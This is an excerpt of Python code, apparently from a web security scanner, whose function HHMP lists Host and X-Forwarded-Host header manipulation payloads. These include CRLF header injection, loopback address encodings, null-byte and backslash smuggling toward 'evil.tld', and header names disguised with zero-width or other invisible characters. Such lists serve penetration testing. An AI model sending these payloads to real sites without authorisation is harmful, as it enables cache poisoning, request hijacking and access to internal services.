...
def HHMP(
    ...
    hhmp_list = [
        ...
        {f"Host": f"{ext.domain}.{ext.suffix}\nX-Injected: true"},
        {"Host": f"{ext.domain}.{ext.suffix}:@31337"}, 
        {"Host": f"{ext.domain}.{ext.suffix} 31337"},  
        {"Host": f"{ext.domain}.{ext.suffix}.p1337"},  
        {"Host": f"p1337.{ext.domain}.{ext.suffix}"},  
        {"Host": f"{ext.domain}.{ext.suffix}/../"}, 
        {"Host": f"{ext.domain}.{ext.suffix}#"}, 
        {"Host": f"{ext.domain}.{ext.suffix}?"}, 
        {"Host": f"{ext.domain}.{ext.suffix}\\evil.tld"}, 
        {"Host": f"{ext.domain}.{ext.suffix},evil.tld"},  
        {"Host": f"[::1]:80"}, 
        {"Host": f"[::ffff:127.0.0.1]"},
        {"Host": f"0x7f000001"},  
        {"Host": f"2130706433"},  
        {"Host": f"{ext.domain}.{ext.suffix}%2e"},  
        {"Host": f"{ext.domain}.{ext.suffix}%00evil.tld"},
        ...
        {"X-Forwarded-Host": f"{ext.domain}.{ext.suffix}, evil.tld"},
        {"X-Forwarded-Host": f"{ext.domain}.{ext.suffix}\tevil.tld"},
        {f'X-Forwarded-Host': f'{ext.domain}\ufeff.{ext.suffix}'},
        {f'X-Forwarded-Host': f'{ext.domain}\ufffe.{ext.suffix}'},
        {f'X-Forwarded-Host': f'{ext.domain}�.{ext.suffix}'},
        ...
        {"Host ": f'{ext.domain}.{ext.suffix}'},
        {"Host\t": f'{ext.domain}.{ext.suffix}'},
        {"\x1dhost": f'{ext.domain}.{ext.suffix}'},
        {f'Host\ufeff': f'{ext.domain}.{ext.suffix}'},
        {f'Host\u200b': f'{ext.domain}.{ext.suffix}'},
        {f'Host\u200c': f'{ext.domain}.{ext.suffix}'},
        {f'Host\u200d': f'{ext.domain}.{ext.suffix}'},
